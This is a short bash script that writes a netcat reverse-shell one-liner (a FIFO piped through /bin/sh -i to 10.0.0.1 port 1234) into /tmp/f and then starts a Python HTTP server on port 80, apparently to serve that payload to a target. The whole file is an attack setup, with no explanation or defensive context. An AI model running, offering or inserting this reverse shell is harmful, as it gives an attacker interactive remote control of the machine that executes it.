#!/bin/bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234" >/tmp/f
python3 -m http.server 80
